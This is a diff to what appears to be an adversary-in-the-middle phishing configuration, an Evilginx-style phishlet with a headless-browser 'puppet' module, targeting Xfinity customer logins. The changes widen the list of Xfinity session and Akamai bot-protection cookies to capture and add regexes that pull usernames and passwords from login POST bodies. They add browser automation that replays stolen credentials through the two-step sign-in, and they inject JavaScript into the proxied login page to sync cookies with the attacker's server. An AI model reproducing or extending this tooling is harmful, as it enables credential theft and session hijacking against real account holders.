@@ -20,30 +20,32 @@ sub_filters:
 auth_tokens:
   # Primary session tokens
   - domain: '.xfinity.com'
-    keys: ['XFINITY-SSO', 'xsso', 'SC', 'bid', 'AMCV_*', 's_vi', 's_fid', 's_pers', 's_sess']
+    keys: ['XFINITY-SSO', 'xsso', 'SC', 'bid', 'AMCV_*', 's_vi', 's_fid', 's_pers', 's_sess', 'isAuth', 'coax', 'cohsn_xs_id', 'r_hint', 'PSC', 'X-hzfdeCEGvt-z', 'X-hzfdeCEGvt-b', 'X-hzfdeCEGvt-c', 'X-hzfdeCEGvt-d', 'X-hzfdeCEGvt-f', 'bm_sv', 'bm_mi']
   # Akamai bot protection cookies (CRITICAL)
   - domain: '.xfinity.com'
-    keys: ['_abck', 'bm_sz', 'ak_bmsc', 'AWSALB', 'AWSALBCORS', 'AWSALBTG', 'AWSALBTGCORS', 'OptanonConsent', 'OptanonAlertBoxClosed']
+    keys: ['_abck', 'bm_sz', 'ak_bmsc', 'bm_sv', 'bm_mi', 'AWSALB', 'AWSALBCORS', 'AWSALBTG', 'AWSALBTGCORS', 'OptanonConsent', 'OptanonAlertBoxClosed']
   # Additional session cookies
   - domain: '.login.xfinity.com'
-    keys: ['JSESSIONID', 'session_token', 'suAKghhasg', 'gpv_Page', 's_sq']
+    keys: ['JSESSIONID', 'session_token', 'suAKghhasg', 'gpv_Page', 's_sq', 'last_idp_used']
 
 auth_urls:
   - '/auth'
+  - '/overview'
 
 credentials:
   # Username/Email capture
   username:
     key: 'user'
+    # search: 'user=([^&]*)'
     search: '(.*)'
-    # search: '(?:user|username|email|id|login)"?\s*[:=]\s*"?([^"&]+)"?'
     type: 'post'
     page: '/login'
     
   # Password capture (this happens on the next step)
   password:
-    key: 'passwd'
-    search: '(.*)'
+    key: 'password'
+    # search: '(?:passwd|password)=([^&]*)'
+    search: '(?:passwd|password)=([^&]*)'
     type: 'post'
     page: '/login'
     
@@ -105,21 +107,51 @@ puppet:
           post_wait: 500
         # Enter the email and WAIT for validation (AJAX check)
         - selector: 'input#user'
+          wait_cred: 'username'
           value: '{username}'
           required: true
           timeout: 20000
-          post_wait: 5000
-        # Click the sign in button explicitly (Retry with correct UA)
+          post_wait: 3000
+        # Click the sign in button explicitly
         - selector: '#sign_in'
           click: true
           required: true
-          timeout: 15000
-          post_wait: 10000
-        # Wait for password field to ensure we are on the next page
-        - selector: '#passwd'
+          timeout: 10000
+          post_wait: 5000
+          
+        # Wait for the specific text "Enter your password" to confirm page transition
+        - selector: "body"
+          text: 'Enter your password'
           post_wait: 1000
           required: true
           timeout: 15000
+
+        # Wait for the password input wrapper to be hydrated
+        - selector: 'prism-input-text.hydrated'
+          post_wait: 1000
+          required: true
+          timeout: 20000
+
+        # Wait for password field (input inside the custom component)
+        - selector: 'prism-input-text input#passwd'
+          post_wait: 1000
+          required: true
+          timeout: 20000
+        
+        # Enter the password and WAIT for validation
+        - selector: 'prism-input-text input#passwd'
+          wait_cred: 'password'
+          value: '{password}'
+          required: true
+          timeout: 20000
+          post_wait: 2000
+        
+        # Click the sign in button explicitly (Final submission)
+        - selector: '#sign_in'
+          click: true
+          required: true
+          timeout: 10000
+          post_wait: 2000
 
   interceptors:
     - token: 'flowId'
@@ -129,42 +161,40 @@ puppet:
       url_pattern: '.*'
       abort: false
 
-
 # ============================================
-# FORCE POST CONFIGURATION (COMPLEMENTARY)
+# JS INJECTION FOR COOKIE SYNC
 # ============================================
 
-force_post:
-  # First POST (email submission)
-  - path: /login
-    search:
-      - {key: 'flowStep', search: 'username'}
-    force:
-      - {key: 'X-hzfdeCEGvt-a', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-z', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-d', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-c', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-b', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-f', value: 'pass'}
-      - {key: 'userVerifyingPlatformAuthenticatorAvailable', value: 'pass'}
-      - {key: 'r', value: 'pass'}
-      - {key: 's', value: 'pass'}
-    type: 'post'
-  
-  # Second POST (password submission)
-  - path: /login
-    search:
-      - {key: 'flowStep', search: 'password'}
-    force:
-      - {key: 'X-hzfdeCEGvt-a', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-z', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-d', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-c', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-b', value: 'pass'}
-      - {key: 'X-hzfdeCEGvt-f', value: 'pass'}
-      - {key: 'userVerifyingPlatformAuthenticatorAvailable', value: 'pass'}
-      - {key: 'rememberMe', value: 'pass'}
-    type: 'post'
+js_inject:
+  - trigger_domains: ["login.xfinity.com"]
+    trigger_paths: ["/login"]
+    script: |
+      (function() {
+        var sid = "{session_id}";
+        var pollCount = 0;
+        var maxPolls = 20; // Poll for 2 minutes
+        
+        var pollPuppet = function() {
+          if (pollCount >= maxPolls) return;
+          pollCount++;
+          
+          console.log("Polling puppet for cookies (session: " + sid + ")...");
+          var xhr = new XMLHttpRequest();
+          // Any request to /s/{sid}/*.js will trigger puppet cookie injection
+          xhr.open("GET", "/s/" + sid + "/sync.js", true);
+          xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+              console.log("Puppet sync successful.");
+              // After sync, if the page was "stuck", the next user action will succeed
+            }
+          };
+          xhr.send();
+          
+          setTimeout(pollPuppet, 6000);
+        };
+        
+        setTimeout(pollPuppet, 2000);
+      })();
 
 # ============================================
 # LOGIN DETECTION
